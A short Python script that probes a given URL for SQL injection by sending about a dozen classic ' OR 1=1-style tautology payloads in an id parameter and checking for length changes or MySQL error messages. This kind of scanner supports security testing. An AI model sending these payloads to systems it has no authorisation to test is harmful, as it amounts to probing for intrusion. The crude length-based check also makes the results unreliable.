import requests
import re

def is_sql_injection_vulnerable(url):
    # List of payloads to test for SQL injection
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "' OR 1=1 #",
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "' OR 'a'='a' /*",
        "' OR 'a'='a' #"
    ]
    
    # Get the original response for comparison
    original_response = requests.get(url + "?id=1")
    original_length = len(original_response.text)
    
    for payload in payloads:
        response = requests.get(url + "?id=" + payload)
        
        # # Check for typical SQL error messages
        # if re.search(r"error|warning|sql|database|query|syntax", response.text, re.IGNORECASE):
        #     return True
        
        # Check for behavioral changes (e.g., different content length)
        if len(response.text) != original_length:
            return True
        
        # Check for specific patterns that indicate a successful injection
        if "You have an error in your SQL syntax" in response.text or "Warning: mysql_fetch_array()" in response.text:
            return True
    
    return False